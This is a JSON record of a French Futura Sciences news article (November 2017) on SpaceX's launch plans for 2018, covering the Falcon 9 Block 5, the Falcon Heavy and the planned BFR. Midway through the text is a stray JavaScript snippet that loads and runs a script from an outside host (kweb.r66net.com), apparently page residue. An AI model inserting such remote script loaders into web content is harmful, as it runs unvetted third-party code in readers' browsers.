{"title": "SpaceX veut accelerer le rythme de ses lancements en 2018", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-11-27", "content": "2018 sera-t-elle l'annee de la maturite pour SpaceX ? La firme d'Elon Musk prevoit d'augmenter sa cadence de lancement. Gwynne Shotwell, presidente et directrice des operations de SpaceX, interviewee par  SpaceNews , fait le point sur l'etat d'avancement des lanceurs en developpement et l'amelioration du Falcon 9. Ce qu'il faut retenir Une trentaine de lancements sont prevus en 2018.  La reutilisabilite est au coeur de la strategie de SpaceX.  Les moteurs des nouveaux lanceurs seront plus performants. Dans une  interview accordee  au site d'informations spatiales  SpaceNews , Gwynne Shotwell, presidente et directrice des operations de  SpaceX , annonce pour 2018 une <<  augmentation de la cadence de lancement avec une dizaine de tirs de plus qu'en 2017  >> ; elle vise, a terme, entre 30 et 40 lancements annuels. Cette annee, la firme d'Elon Musk a deja realise 16 lancements ; 3, voire 4, missions sont a realiser d'ici la fin 2017. Les missions prevues en 2018 n'incluent pas celles dediees au deploiement des quelque 4.425 satellites de la constellation SpaceX. Bien que l'entreprise se soit exprimee sur ce sujet devant une commission du Congres des Etats-Unis, Gwynne Shotwell est restee evasive sur la date des premiers lancements, <<  qui pourraient debuter ces prochains mois  >>. En 2018, la version Block 4 du  Falcon 9  laissera la place a la Block 5, plus puissante, avec un moteur Merlin qui <<  delivrera une poussee de 190.000 livres, contre 176.000 pour l'actuel Merlin 1D  >>. Les evolutions de cette version sont largement inspirees des demandes de la Nasa, dans le cadre des missions commerciales d'equipage, et de celles de l'armee de l' Air  des Etats-Unis, pour ses missions militaires. En 2018, une version amelioree du Falcon 9 sera mise en service, avec un objectif de reduction du temps de la remise en etat de vol de l'etage recupere. (c) SpaceX                               Le Falcon 9 et le Falcon Heavy Cette cinquieme version du Falcon 9, dont le  premier vol  date de juin 2010, est concue avec un objectif de <<  reutilisation de dix fois de l'etage principal, voire plus, et la reduction du cycle de la  reutilisation de l'etage principal  entre deux vols  >>. Les ameliorations apportees ont aussi pour but de simplifier la fabricabilite du lanceur.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le Falcon Heavy, dont l' etage principal  est forme de trois etages principaux du Falcon 9, utilisera egalement la version Block 5, sauf lors de son vol inaugural (le lanceur est en cours de construction). Ce premier tir, dont la date n'a toujours pas ete officiellement annoncee, est attendu d'ici la fin de l'annee 2017, mais <<  pourrait finalement avoir lieu seulement en janvier  >>.  Le Big Falcon Rocket, un lanceur a tout faire A l'horizon 2022, SpaceX prevoit de remplacer le Falcon 9 et le Falcon Heavy par le  Big Falcon Rocket  (BFR), un lanceur entierement reutilisable et dedie au lancement de satellites, aux vols habites et aux missions d'exploration. Celui-ci a ete presente en octobre 2017, lors du Congres international d' astronautique  (IAC) qui s'est tenu en Australie. Neanmoins, <<  le Falcon 9 et le Falcon Heavy resteront en service tant qu'il y aura une demande pour les utiliser  >>.  Ce futur lanceur sera equipe du moteur Raptor, qui fonctionne avec un melange de methane et d' oxygene . L'etage principal du BFR comptera 31 de ces moteurs (6 pour l'etage superieur), contre 27 moteurs Merlin pour le Falcon Heavy et 9 pour le Falcon 9. Il fut un temps envisage d'adapter les moteurs Raptor au lanceur Falcon 9, mais ce ne sera finalement pas le cas. Enfin, SpaceX travaille aussi sur des tests de recuperation de la coiffe du Falcon 9 et sur une tentative de recuperation d'un etage superieur pour le reutiliser. Il s'agit moins d'une question de reduction de couts que d'en savoir plus sur la reutilisabilite complete d'un lanceur pour preparer au mieux les differentes versions du BFR qui seront nativement reutilisables. ", "theme": "sciences"}